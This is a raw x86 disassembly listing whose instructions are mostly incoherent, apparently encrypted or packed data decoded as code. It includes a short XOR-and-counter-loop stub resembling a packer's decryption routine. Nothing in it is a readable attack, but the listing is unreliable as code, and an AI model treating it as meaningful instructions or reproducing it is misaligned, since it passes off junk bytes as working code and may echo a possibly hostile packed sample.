  40f450:	cmp    esi,DWORD PTR [ecx-0x10]
  40f453:	add    bl,BYTE PTR [esi+0x6297317]
  40f459:	cdq    
  40f45a:	sbb    ebp,0x626c6fb6
  40f460:	jnp    0x40f498
  40f462:	cmp    eax,0x7779ef50
  40f467:	sbb    edx,DWORD PTR [ebx-0x6b]
  40f46a:	(bad)  
  40f46b:	and    ch,bl
  40f46d:	inc    ecx
  40f46e:	or     DWORD PTR [edi+0x6f],eax
  40f471:	or     eax,0x18f32cc
  40f476:	sub    al,0x11
  40f478:	dec    edi
  40f479:	mov    ss,edx
  40f47b:	jbe    0x40f4d1
  40f47d:	xchg   ebp,eax
  40f47e:	pop    ebx
  40f47f:	pop    edx
  40f480:	or     al,0xde
  40f482:	popf   
  40f483:	das    
  40f484:	mov    dl,0xf8
  40f486:	cmp    bh,BYTE PTR [esi+0x14597dce]
  40f48c:	rcr    ebp,0x2d
  40f48f:	mov    esi,0x8fc44d9e
  40f494:	sub    edi,DWORD PTR [eax+0x1e]
  40f497:	test   al,0x51
  40f499:	addr16 mov eax,ds:0xbc5e
  40f49d:	repnz and ecx,DWORD PTR [eax-0x13]
  40f4a1:	cdq    
  40f4a2:	push   esi
  40f4a3:	push   edi
  40f4a4:	jle    0x40f4fe
  40f4a6:	add    eax,0x429372c
  40f4ab:	fsubr  st,st(0)
  40f4ad:	enter  0xaa3a,0xf2
  40f4b1:	dec    ebx
  40f4b2:	add    eax,0xa3707e70
  40f4b7:	rol    DWORD PTR [ebx],1
  40f4b9:	mov    ebp,0x28350ca1
  40f4be:	jl     0x40f49b
  40f4c0:	jmp    0x2505:0xf0abe96d
  40f4c7:	test   DWORD PTR [ebx-0xe],esp
  40f4ca:	stc    
  40f4cb:	push   edx
  40f4cc:	sub    al,0x3f
  40f4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4cf:	ins    BYTE PTR es:[edi],dx
  40f4d0:	outs   dx,DWORD PTR ds:[esi]
  40f4d1:	jp     0x40f50b
  40f4d3:	ja     0x40f4ea
  40f4d5:	loope  0x40f527
  40f4d7:	sub    al,0x6a
  40f4d9:	jge    0x40f4b4
  40f4db:	stc    
  40f4dc:	das    
  40f4dd:	cmp    ecx,DWORD PTR [esp+ebx*8-0x49]
  40f4e1:	mov    eax,esi
  40f4e3:	jl     0x40f4e9
  40f4e5:	rcr    DWORD PTR [ecx],cl
  40f4e7:	and    eax,0xfdca54a7
  40f4ec:	adc    ebp,DWORD PTR [edx-0x49]
  40f4ef:	inc    ebx
  40f4f0:	push   0x3e5e6b8d
  40f4f5:	push   esp
  40f4f6:	clc    
  40f4f7:	call   0xfc0b:0xa1a14628
  40f4fe:	outs   dx,DWORD PTR ds:[esi]
  40f4ff:	aam    0x70
  40f501:	enter  0xe62b,0x83
  40f505:	or     al,0xaa
  40f507:	outs   dx,BYTE PTR ds:[esi]
  40f508:	mov    dh,0xb4
  40f50a:	iret   
  40f50b:	mov    BYTE PTR [edi],cl
  40f50d:	jecxz  0x40f521
  40f50f:	cmp    eax,ebx
  40f511:	or     cl,BYTE PTR [esi+0x5d]
  40f514:	int    0x15
  40f516:	in     eax,0xe7
  40f518:	add    esp,DWORD PTR ds:0x1313a2d7
  40f51e:	mov    esp,0x867160ff
  40f523:	fld    DWORD PTR [ebx-0x31e649af]
  40f529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f52a:	jl     0x40f4ed
  40f52c:	sar    cl,0x93
  40f52f:	hlt    
  40f530:	je     0x40f546
  40f532:	mov    ebp,0x930231b3
  40f537:	adc    eax,DWORD PTR [esi+0x3e]
  40f53a:	add    BYTE PTR [esi],ch
  40f53c:	repnz test eax,0xba7f121a
  40f542:	das    
  40f543:	leave  
  40f544:	or     esp,ecx
  40f546:	xor    BYTE PTR [ecx-0x10],dh
  40f549:	and    DWORD PTR [edx-0x166bfad4],ebx
  40f54f:	mov    ah,0x1
  40f551:	mov    esi,0xd85d77c6
  40f556:	cmp    bl,BYTE PTR [ecx-0x67d6d284]
  40f55c:	pop    es
  40f55d:	inc    edx
  40f55e:	mov    dl,0x8b
  40f560:	cli    
  40f561:	(bad)
  40f565:	mov    dh,0x7d
  40f567:	call   0x9778b79e
  40f56c:	or     ecx,DWORD PTR [edi+esi*8+0xd]
  40f570:	sbb    al,0x42
  40f572:	repz xchg esi,eax
  40f574:	xor    bh,BYTE PTR [edi]
  40f576:	pop    ecx
  40f577:	mov    dl,0x10
  40f579:	leave  
  40f57a:	xchg   ebp,eax
  40f57b:	iret   
  40f57c:	or     eax,0x5189cb63
  40f581:	ret    
  40f582:	add    al,dl
  40f584:	outs   dx,DWORD PTR ds:[esi]
  40f585:	mov    esp,0x49ae5658
  40f58a:	leave  
  40f58b:	daa    
  40f58c:	fisubr DWORD PTR [ebp+0x64]
  40f58f:	mov    ds:0x6bb08567,eax
  40f594:	je     0x40f526
  40f596:	and    al,0x4d
  40f598:	mov    ecx,DWORD PTR [eax+0x46ed59f2]
  40f59e:	push   ebx
  40f59f:	test   al,0xa9
  40f5a1:	push   eax
  40f5a2:	shr    BYTE PTR [ebx+edx*2],1
  40f5a5:	aas    
  40f5a6:	ret    0xccd4
  40f5a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5aa:	lods   eax,DWORD PTR ds:[esi]
  40f5ab:	ja     0x40f5e8
  40f5ad:	ins    DWORD PTR es:[edi],dx
  40f5ae:	mov    ?,WORD PTR [edi-0x7c]
  40f5b1:	pop    ds
  40f5b2:	sub    ebx,DWORD PTR [edx-0x1d]
  40f5b5:	mov    ch,0xc4
  40f5b7:	jae    0x40f606
  40f5b9:	xchg   ecx,ebp
  40f5bb:	jmp    0x8751b822
  40f5c0:	ins    BYTE PTR es:[edi],dx
  40f5c1:	mov    ds:0x112e342,eax
  40f5c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5c7:	mov    al,0x52
  40f5c9:	fwait
  40f5ca:	and    dl,BYTE PTR [esi+0x3cda6573]
  40f5d0:	add    al,0xcd
  40f5d2:	and    cl,BYTE PTR [ecx-0x57]
  40f5d5:	sub    al,BYTE PTR [edi-0x53]
  40f5d8:	dec    esp
  40f5d9:	gs pop edx
  40f5db:	pop    edi
  40f5dc:	or     ch,BYTE PTR [esi-0x5c047f84]
  40f5e2:	in     al,0xcd
  40f5e4:	push   esp
  40f5e5:	pop    es
  40f5e6:	sbb    edx,0x6e7a6c6f
  40f5ec:	stc    
  40f5ed:	pop    ebx
  40f5ee:	jb     0x40f579
  40f5f0:	fwait
  40f5f1:	je     0x40f5c5
  40f5f3:	hlt    
  40f5f4:	repz push edx
  40f5f6:	dec    esi
  40f5f7:	xor    cl,BYTE PTR [edi+ebp*2]
  40f5fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5fb:	mov    bl,0x69
  40f5fd:	add    al,0x28
  40f5ff:	sub    eax,DWORD PTR [edi-0x711c655]
  40f605:	sbb    BYTE PTR [edx+eax*8-0x425de273],bl
  40f60c:	or     al,0x23
  40f60e:	sub    dh,0x9e
  40f611:	xor    al,0x18
  40f613:	jmp    0xd806:0x7528cb9
  40f61a:	out    dx,eax
  40f61b:	sbb    dh,0xb7
  40f61e:	lods   eax,DWORD PTR ds:[esi]
  40f61f:	xchg   BYTE PTR [ebx],bh
  40f621:	pop    ebx
  40f622:	xor    al,0x13
  40f624:	mov    al,0xd3
  40f626:	pop    ebp
  40f627:	leave  
  40f628:	mov    DWORD PTR [ebp-0x519d2fb4],esi
  40f62e:	retf   0xa853
  40f631:	aas    
  40f632:	cmp    al,0xa3
  40f634:	mov    cl,0x1e
  40f636:	nop
  40f637:	pop    ss
  40f638:	ins    DWORD PTR es:[edi],dx
  40f639:	fmul   QWORD PTR [esi]
  40f63b:	xor    al,BYTE PTR [edx-0x49]
  40f63e:	push   eax
  40f63f:	imul   ebx,DWORD PTR [esi],0x67
  40f642:	mov    dl,0xd5
  40f644:	addr16 out dx,al
  40f646:	mov    ah,0xe4
  40f648:	xor    eax,0xcf01a077
  40f64d:	mov    DWORD PTR [ecx+ecx*8],esp
  40f650:	mov    ebp,0x907ca174
  40f655:	gs pop ecx
  40f657:	sti    
  40f658:	ds (bad) 
  40f65a:	enter  0x221d,0x75
  40f65e:	ja     0x40f684
  40f660:	or     dh,BYTE PTR [ecx+0x73]
  40f663:	mov    DWORD PTR [ebx],0x8551b821
  40f669:	push   ebx
  40f66a:	mov    esi,0xfa91963c
  40f66f:	jmp    0xbed3:0x118987e2
  40f676:	xchg   dh,dh
  40f678:	js     0x40f62f
  40f67a:	test   eax,0xbd847aa3
  40f67f:	pusha  
  40f680:	out    dx,eax
  40f681:	fucom  st(5)
  40f683:	pop    ebp
  40f684:	idiv   DWORD PTR [ebx-0x30]
  40f687:	pop    ds
  40f688:	jae    0x40f682
  40f68a:	ja     0x40f6d3
  40f68c:	outs   dx,DWORD PTR ds:[esi]
  40f68d:	sbb    ebx,esp
  40f68f:	xchg   BYTE PTR ds:0xbf3b7da5,al
  40f695:	fwait
  40f696:	push   esi
  40f697:	jne    0x40f711
  40f699:	mov    ?,esp
  40f69b:	xchg   edi,eax
  40f69c:	or     BYTE PTR [ecx+esi*4],cl
  40f69f:	mov    cs,WORD PTR [ebp-0x61]
  40f6a2:	dec    DWORD PTR [ebx-0x59]
  40f6a5:	mov    ds:0x9a3a56f6,al
  40f6aa:	jae    0x40f6ea
  40f6ac:	inc    ecx
  40f6ad:	dec    edi
  40f6ae:	cs imul edi,esi,0x20
  40f6b2:	or     al,0x99
  40f6b4:	test   eax,0xffd279b1
  40f6b9:	inc    eax
  40f6ba:	inc    esp
  40f6bb:	ins    BYTE PTR es:[edi],dx
  40f6bc:	dec    ecx
  40f6bd:	push   eax
  40f6be:	sbb    eax,0x499ed2
  40f6c3:	in     eax,0x13
  40f6c5:	or     DWORD PTR [edi-0xac9e86],edx
  40f6cb:	dec    eax
  40f6cc:	xor    DWORD PTR [esi],edx
  40f6ce:	out    dx,eax
  40f6cf:	sti    
  40f6d0:	shl    esi,cl
  40f6d2:	gs inc edi
  40f6d4:	jle    0x40f65c
  40f6d6:	stos   DWORD PTR es:[edi],eax
  40f6d7:	xchg   edx,eax
  40f6d8:	sbb    eax,0x6ccd9bf8
  40f6dd:	sbb    edx,DWORD PTR [ebp+0x62]
  40f6e0:	xchg   esi,eax
  40f6e1:	pop    ebp
  40f6e2:	bound  ecx,QWORD PTR [ebx]
  40f6e4:	shl    DWORD PTR [ebx-0x72],1
  40f6e7:	pop    esp
  40f6e8:	mov    ds,WORD PTR [edx-0x547e5196]
  40f6ee:	xchg   ebx,eax
  40f6ef:	jae    0x40f752
  40f6f1:	popf   
  40f6f2:	sar    BYTE PTR [ebx+0x6c],1
  40f6f5:	lds    esp,FWORD PTR [ebp+edi*2+0x548616f9]
  40f6fc:	test   DWORD PTR [eax+0x71],eax
  40f6ff:	jb     0x40f6a7
  40f701:	inc    edx
  40f702:	add    al,0xf3
  40f704:	sti    
  40f705:	sub    eax,0x8503638c
  40f70a:	mov    dh,0x13
  40f70c:	loope  0x40f786
  40f70e:	test   BYTE PTR [ebp+0x1e10a87c],ah
  40f714:	fisubr DWORD PTR [edx]
  40f716:	sar    edi,0xb3
  40f719:	stos   DWORD PTR es:[edi],eax
  40f71a:	aaa    
  40f71b:	imul   ebp,esp,0x6c408f55
  40f721:	imul   ebp,esi,0xffffff88
  40f724:	hlt    
  40f725:	pop    edi
  40f726:	scas   al,BYTE PTR es:[edi]
  40f727:	cmp    edi,esi
  40f729:	dec    esi
  40f72a:	nop
  40f72b:	inc    esp
  40f72c:	mov    ebp,0xec8d8f1d
  40f731:	xchg   esp,eax
  40f732:	idiv   DWORD PTR [ebx+0x41]
  40f735:	test   BYTE PTR [ebx-0x3e],0x9e
  40f739:	mov    esp,0x80642172
  40f73e:	push   eax
  40f73f:	js     0x40f757
  40f741:	call   0x9f3e:0x8fe20334
  40f748:	push   0x36
  40f74a:	scas   al,BYTE PTR es:[edi]
  40f74b:	cmp    BYTE PTR [edx],al
  40f74d:	iret   
  40f74e:	add    ebx,ebp
  40f750:	or     al,0x6a
  40f752:	out    dx,al
  40f753:	jg     0x40f70c
  40f755:	push   0x43
  40f757:	inc    ecx
  40f758:	inc    esp
  40f759:	xchg   ebp,eax
  40f75a:	fnsave [ecx]
  40f75c:	jmp    0xca68:0x5b6a138e
  40f763:	inc    eax
  40f764:	add    BYTE PTR ds:0x7370f1d5,ah
  40f76a:	sub    cl,BYTE PTR [edx-0x61046a39]
  40f770:	lahf   
  40f771:	cmp    al,0x8d
  40f773:	or     eax,0x6d7f7744
  40f778:	ret    0xce97
  40f77b:	push   ds
  40f77c:	cs sub ebx,esp
  40f77f:	and    eax,0x30242e93
  40f784:	pusha  
  40f785:	pop    eax
  40f786:	add    al,0x69
  40f788:	mov    al,0xb9
  40f78a:	lds    ecx,FWORD PTR ds:0x72e46762
  40f790:	rol    ecx,1
  40f792:	fisubr DWORD PTR [edx+0x1d]
  40f795:	adc    edi,0xea0251ef
  40f79b:	sar    BYTE PTR [esi-0x64],cl
  40f79e:	mov    ch,0x27
  40f7a0:	ret    
  40f7a1:	and    dh,BYTE PTR [esi-0x2f]
  40f7a4:	bound  esi,QWORD PTR [ebx+0x345cc309]
  40f7aa:	or     eax,edi
  40f7ac:	repz lea ebp,ds:[ebx+0x5f]
  40f7b1:	in     eax,dx
  40f7b2:	mov    ds:0xe378f7fd,al
  40f7b7:	inc    ebp
  40f7b8:	xchg   edx,eax
  40f7b9:	or     DWORD PTR [edi+0x15],eax
  40f7bc:	and    DWORD PTR [esi+ebx*8+0x68],0xffffff9f
  40f7c1:	repnz mov cl,0x4a
  40f7c4:	xchg   ecx,eax
  40f7c5:	out    dx,eax
  40f7c6:	mov    ecx,0x75108b3
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x430a38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0x80b2f349
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	sub    DWORD PTR [eax-0x72],0x36
  40f874:	dec    esi
  40f875:	out    dx,eax
  40f876:	xchg   edi,eax
  40f877:	xchg   ecx,eax
  40f878:	mov    dh,0xc7
  40f87a:	dec    ebx
  40f87b:	mov    eax,ds:0x70c55d70
  40f880:	imul   eax,DWORD PTR ds:0xd140696c,0xffffffac
  40f887:	shl    edx,0x78
  40f88a:	nop
  40f88b:	stc    
  40f88c:	outs   dx,BYTE PTR ds:[esi]
  40f88d:	(bad)  
  40f88e:	jp     0x40f85b
  40f890:	call   0x974d2822
  40f895:	inc    ecx
  40f896:	clc    
  40f897:	push   ds
  40f898:	ss or  al,0x37
  40f89b:	jb     0x40f8f1
  40f89d:	mov    ds:0x6ad84177,eax
  40f8a2:	sbb    al,0x65
  40f8a4:	push   eax
  40f8a5:	sub    DWORD PTR [ecx-0x501bb4ea],esi
  40f8ab:	push   eax
  40f8ac:	pop    eax
  40f8ad:	mov    bl,0xb6
  40f8af:	push   esi
  40f8b0:	jp     0x40f87f
  40f8b2:	dec    esp
  40f8b3:	mov    esi,0xf6abab04
  40f8b8:	iret   
  40f8b9:	data16 sti 
  40f8bb:	mov    edi,0xa3c7faf2
  40f8c0:	mov    ebp,0xe56da822
  40f8c5:	fidiv  DWORD PTR [eax+0x1a]
  40f8c8:	add    DWORD PTR [ebp+0x5a],edx
  40f8cb:	pop    es
  40f8cc:	push   ss
  40f8cd:	inc    BYTE PTR [ebx+0x7f676cfe]
  40f8d3:	xrelease mov BYTE PTR [ecx+0x79040518],cl
  40f8da:	aad    0xe1
  40f8dc:	push   edi
  40f8dd:	xor    DWORD PTR [edx],edi
  40f8df:	aam    0xb6
  40f8e1:	out    dx,al
  40f8e2:	push   edx
  40f8e3:	lods   al,BYTE PTR ds:[esi]
  40f8e4:	xchg   cl,cl
  40f8e6:	popa   
  40f8e7:	push   cs
  40f8e8:	(bad)  
  40f8ea:	stos   BYTE PTR es:[edi],al
  40f8eb:	leave  
  40f8ec:	out    0xf5,eax
  40f8ee:	cmp    dl,BYTE PTR [eax+0x5d84af5c]
  40f8f4:	jmp    0x40f88d
  40f8f6:	mov    ebp,0x462c6f6e
  40f8fb:	popf   
  40f8fc:	fnstsw WORD PTR [ecx]
  40f8fe:	xor    eax,0x96c29b4c
  40f903:	jle    0x40f88c
  40f905:	sub    BYTE PTR ds:0xd0d0ccf1,cl
  40f90b:	mov    ch,ah
  40f90d:	cmp    ebx,ecx
  40f90f:	cli    
  40f910:	stos   BYTE PTR es:[edi],al
  40f911:	fisttp DWORD PTR [edi-0x1f]
  40f914:	mov    cl,dl
  40f916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f917:	push   0xe54c4681
  40f91c:	pop    edi
  40f91d:	mov    ebp,0xf265953f
  40f922:	sbb    cl,BYTE PTR [ebx]
  40f924:	daa    
  40f925:	or     edx,DWORD PTR [esi-0x55795a0e]
  40f92b:	shl    ecx,0xe7
  40f92e:	cmp    DWORD PTR ds:[ebx-0x63],ebx
  40f932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f933:	cmp    DWORD PTR [ebp-0x1b],0xe66e726f
  40f93a:	inc    eax
  40f93b:	(bad)  
  40f93c:	sti    
  40f93d:	test   eax,0x8ae40ff6
  40f942:	push   0x895a3417
  40f947:	mov    bl,0x25
  40f949:	mov    ds:0xc102b889,eax
  40f94e:	xor    BYTE PTR [ebx],ch
  40f950:	xchg   ebp,eax
  40f951:	sar    edx,cl
  40f953:	lods   eax,DWORD PTR ds:[esi]
  40f954:	sub    eax,0xf378dcfa
  40f959:	xchg   esp,eax
  40f95a:	jb     0x40f95d
  40f95c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f95d:	mov    WORD PTR ds:0x4011929c,gs
  40f963:	or     DWORD PTR [ebp-0x4c210b0e],eax
  40f969:	pop    ebp
  40f96a:	mov    ch,BYTE PTR [ebp+esi*8-0x623bd658]
  40f971:	sub    eax,0x9a89cc7c
  40f976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f977:	test   al,0x7b
  40f979:	dec    ecx
  40f97a:	sub    DWORD PTR [ebx-0x743b59fe],ebp
  40f980:	retf   0x6dfa
  40f983:	shl    DWORD PTR [esp+esi*8],1
  40f986:	ret    
  40f987:	(bad)  
  40f988:	in     al,dx
  40f989:	nop
  40f98a:	in     eax,0x5f
  40f98c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f98d:	inc    ebx
  40f98e:	fild   QWORD PTR [eax-0x4b]
  40f991:	cld    
  40f992:	cmp    DWORD PTR [ecx-0x2e506405],edi
  40f998:	dec    ebp
  40f999:	adc    edx,DWORD PTR [edx+0x55]
  40f99c:	enter  0xa578,0x33
  40f9a0:	imul   ebp,esi,0x887d3dbd
  40f9a6:	pushf  
  40f9a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9a8:	fucomip st,st(6)
  40f9aa:	mov    bl,0xaf
  40f9ac:	add    eax,eax
  40f9ae:	and    bh,bh
  40f9b0:	clc    
  40f9b1:	lea    ecx,[ebp+esi*8-0x65]
  40f9b5:	xor    al,0x80
  40f9b7:	jnp    0x40f9bb
  40f9b9:	jae    0x40f959
  40f9bb:	add    DWORD PTR [ecx],edx
  40f9bd:	and    edx,ebp
  40f9bf:	sub    eax,0x94a8e030
  40f9c4:	in     eax,0x97
  40f9c6:	xchg   ebp,eax
  40f9c7:	rcr    BYTE PTR ds:0x7daa9664,cl
  40f9cd:	sbb    di,WORD PTR [esi+0x6d0f153f]
  40f9d4:	call   0xe82b3260
  40f9d9:	lock int 0x5a
  40f9dc:	xchg   esp,eax
  40f9dd:	jnp    0x40f9a0
  40f9df:	test   edi,ecx
  40f9e1:	push   0x69
  40f9e3:	push   esi
  40f9e4:	mov    ?,ebp
  40f9e6:	sbb    BYTE PTR [ecx],al
  40f9e8:	pusha  
  40f9e9:	in     al,0xa9
  40f9eb:	ja     0x40fa3a
  40f9ed:	clc    
  40f9ee:	loop   0x40fa30
  40f9f0:	inc    ebx
  40f9f1:	add    ebp,DWORD PTR gs:[ecx+0x6b]
  40f9f5:	mov    edx,0xd3a4b65a
  40f9fa:	push   edx
  40f9fb:	add    eax,0x1447d26c
  40fa00:	mov    cs,ebx
  40fa02:	stos   DWORD PTR es:[edi],eax
  40fa03:	inc    esi
  40fa04:	enter  0xa79c,0xb8
  40fa08:	pop    ebp
  40fa09:	sbb    eax,0x90c9a0dc
  40fa0e:	dec    esp
  40fa0f:	adc    al,0x87
  40fa11:	xor    DWORD PTR [esi-0x71],esp
  40fa14:	push   esp
  40fa15:	dec    ebp
  40fa16:	mov    ds:0x354ae6c,eax
  40fa1b:	ins    BYTE PTR es:[edi],dx
  40fa1c:	and    cl,BYTE PTR [ebx+0x9]
  40fa1f:	push   es
  40fa20:	xchg   ch,bl
  40fa22:	pop    ebx
  40fa23:	sbb    ah,BYTE PTR [ebx+0x4b58a46c]
  40fa29:	xor    al,0xaa
  40fa2b:	neg    dl
  40fa2d:	jbe    0x40fa58
  40fa2f:	jo     0x40f9cf
  40fa31:	mov    edx,0xb8fb4b4c
  40fa36:	and    al,0x5
  40fa38:	adc    al,BYTE PTR [eax+0x2f]
  40fa3b:	loop   0x40f9f1
  40fa3d:	and    eax,0x8557bebf
  40fa42:	jecxz  0x40fab3
  40fa44:	add    BYTE PTR [esi+0x26],0x80
  40fa48:	ret    
  40fa49:	cmp    bl,BYTE PTR [edx-0x7b]
  40fa4c:	cmp    eax,0x244882c1
  40fa51:	sbb    eax,0x9a496c91
  40fa56:	pop    ecx
  40fa57:	xchg   edx,eax
  40fa58:	mov    bl,0xf9
  40fa5a:	sbb    bl,BYTE PTR [eax-0x1c]
  40fa5d:	xchg   DWORD PTR [ebp+ecx*2-0x20],ebx
  40fa61:	xlat   BYTE PTR ds:[ebx]
  40fa62:	pusha  
  40fa63:	ror    BYTE PTR [ebx],1
  40fa65:	jns    0x40fab3
  40fa67:	sti    
  40fa68:	mov    esp,gs
  40fa6a:	gs mov cl,0x6b
  40fa6d:	pop    esi
  40fa6e:	push   0xadc3b73a
  40fa73:	xlat   BYTE PTR ds:[ebx]
  40fa74:	shr    DWORD PTR [esi*1+0x78775aea],0xf7
  40fa7c:	cmp    cl,al
  40fa7e:	mov    edi,0x51570603
  40fa83:	mov    DWORD PTR es:[esi+0x30eb8e2e],edi
  40fa8a:	jmp    0x5cb7697
  40fa8f:	xlat   BYTE PTR ds:[ebx]
  40fa90:	jl     0x40fa41
  40fa92:	or     DWORD PTR gs:[ecx],edi
  40fa95:	(bad)  
  40fa96:	arpl   si,di
  40fa98:	sbb    eax,0x6f9c22cc
  40fa9d:	in     al,0xb
  40fa9f:	push   esi
  40faa0:	jl     0x40fa76
  40faa2:	cmp    dh,0x75
  40faa5:	add    eax,edi
  40faa7:	ss xchg ebx,eax
  40faa9:	mov    al,0x7d
  40faab:	pop    es
  40faac:	add    al,0x5e
  40faae:	daa    
  40faaf:	or     DWORD PTR [ebx+0x3a],eax
  40fab2:	or     ah,BYTE PTR [ebp-0x25b98294]
  40fab8:	call   0x85bc5cb4
  40fabd:	jg     0x40fa6a
  40fabf:	or     eax,0x3f2e5214
  40fac4:	sub    DWORD PTR [ecx+0x2f],ecx
  40fac7:	leave  
  40fac8:	repnz repz push ds
  40facb:	int3   
  40facc:	push   ds
  40facd:	pushf  
  40face:	call   0xfb0d71b4
  40fad3:	fidiv  WORD PTR [edx]
  40fad5:	jecxz  0x40fb28
  40fad7:	add    eax,0x2a7f84c2
  40fadc:	in     al,0xf4
  40fade:	or     edi,edi
  40fae0:	aas    
  40fae1:	fild   QWORD PTR ds:[edi+0x30]
  40fae5:	ds and ah,bl
  40fae8:	push   edx
  40fae9:	retf   0xfced
  40faec:	std    
  40faed:	xchg   ebx,eax
  40faee:	fisub  WORD PTR ds:0x97d7fe9f
  40faf4:	and    eax,0x5829c8c
  40faf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fafa:	xor    eax,0x9a7a6aa9
  40faff:	sahf   
  40fb00:	fadd   DWORD PTR [edi+0x2ff2e114]
  40fb06:	add    al,BYTE PTR [esi-0x7e5ae9e5]
  40fb0c:	jns    0x40faa0
  40fb0e:	inc    edi
  40fb0f:	dec    ecx
  40fb10:	push   es
  40fb11:	push   ecx
  40fb12:	sub    al,0x4d
  40fb14:	imul   ebp,DWORD PTR [ebp+0xb473f2f],0xbc75a4f5
  40fb1e:	push   esp
  40fb1f:	retf   0x1d5e
  40fb22:	adc    cl,BYTE PTR [esi+edx*1+0x7d97bab9]
  40fb29:	jg     0x40fb55
  40fb2b:	xor    edi,DWORD PTR [edi+0x201e99a3]
  40fb31:	mov    eax,ds:0x59a63c64
  40fb36:	pop    esi
  40fb37:	fwait
  40fb38:	and    BYTE PTR [esp+edi*2-0x74],bh
  40fb3c:	pop    edi
  40fb3d:	imul   ecx,DWORD PTR [ebp-0x5b],0x6b69d6bc
  40fb44:	jb     0x40fb09
  40fb46:	out    0x54,al
  40fb48:	jl     0x40fb2f
  40fb4a:	mov    esp,0x658bb2fc
  40fb4f:	inc    ebx
  40fb50:	les    esi,FWORD PTR [esi+0x553cea3c]
  40fb56:	pop    ss
  40fb57:	xor    BYTE PTR [esi],al
  40fb59:	xchg   esi,eax
  40fb5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb5b:	mov    dh,0x75
  40fb5d:	je     0x40fb15
  40fb5f:	push   ecx
  40fb60:	xchg   edx,edx
  40fb62:	xchg   DWORD PTR [ecx+eiz*4],ebp
  40fb65:	(bad)  
  40fb66:	aaa    
  40fb67:	xchg   ebp,eax
  40fb68:	mov    ecx,0x63ea3fe0
  40fb6d:	iret   
  40fb6e:	(bad)  
  40fb70:	aam    0xc8
  40fb72:	mov    esi,0x6a6da68b
  40fb77:	mov    ch,0xfa
  40fb79:	xchg   edi,eax
  40fb7a:	pop    ss
  40fb7b:	sbb    DWORD PTR [ebx+0x34a93e6b],ecx
  40fb81:	jge    0x40fbf7
  40fb83:	cdq    
  40fb84:	mov    ecx,DWORD PTR [esi+0xb524977]
  40fb8a:	or     eax,0x3f3cacb6
  40fb8f:	(bad)  
  40fb90:	cdq    
  40fb91:	jmp    0x40fb72
  40fb93:	out    0xee,eax
  40fb95:	imul   edi,DWORD PTR [edi],0x25
  40fb98:	mov    esi,0xfe6a7727
  40fb9d:	mov    cl,0xfb
  40fb9f:	call   0x90516183
  40fba4:	gs shl bh,0xa
  40fba8:	add    BYTE PTR [edi+0x4575ac71],dl
  40fbae:	shr    DWORD PTR [edx-0x59e27ae8],cl
  40fbb4:	loope  0x40fbfd
  40fbb6:	hlt    
  40fbb7:	test   BYTE PTR [edi+0x36],ch
  40fbba:	nop
  40fbbb:	jae    0x40fba8
  40fbbd:	outs   dx,DWORD PTR ss:[esi]
  40fbbf:	into   
  40fbc0:	mov    bl,0x95
  40fbc2:	std    
  40fbc3:	inc    ebx
  40fbc4:	sub    eax,0x44072a97
  40fbc9:	jmp    0x3b85a6c4
  40fbce:	xchg   DWORD PTR [esi-0x6818b431],esi
  40fbd4:	scas   eax,DWORD PTR es:[edi]
  40fbd5:	ficom  WORD PTR [edi]
  40fbd7:	or     bl,al
  40fbd9:	into   
  40fbda:	retf   0xb94f
  40fbdd:	scas   eax,DWORD PTR es:[edi]
  40fbde:	mov    bl,0xca
  40fbe0:	sbb    DWORD PTR [edx+0x1f],edx
  40fbe3:	bound  ebx,QWORD PTR [ebx+edi*4+0x34]
  40fbe7:	or     bl,BYTE PTR [ecx]
  40fbe9:	jno    0x40fc0b
  40fbeb:	sbb    ch,bl
  40fbed:	mov    bh,0x22
  40fbef:	cdq    
  40fbf0:	in     al,0x52
  40fbf2:	ret    
  40fbf3:	and    ch,BYTE PTR [eax]
  40fbf5:	mov    esp,0x9dd6cb18
  40fbfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbfb:	xor    al,0x8d
  40fbfd:	cld    
  40fbfe:	call   0xb434:0xf8c747c8
  40fc05:	leave  
  40fc06:	add    DWORD PTR [ecx-0x1b],ebp
